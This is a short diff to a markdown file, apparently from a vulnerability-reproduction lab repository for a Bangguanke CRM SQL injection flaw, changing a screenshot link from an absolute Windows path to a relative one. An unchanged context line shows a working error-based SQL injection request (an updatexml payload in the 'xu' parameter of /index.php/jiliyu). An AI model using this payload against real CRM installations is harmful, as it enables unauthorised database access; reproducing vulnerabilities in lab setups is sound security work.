@@ -36,4 +36,4 @@ docker compose up
 
 `GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=%E6%BF%80%E5%8A%B1%E8%AF%AD%E5%88%97%E8%A1%A8&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)) HTTP/1.1`
 
-![image-20240319150246000](C:\Users\admin\Documents\GitHub\Vuldocker\帮管客CRM\帮管客 CRM jiliyu SQL注入漏洞\3.png)
+![image-20240319150246000](./3.png)
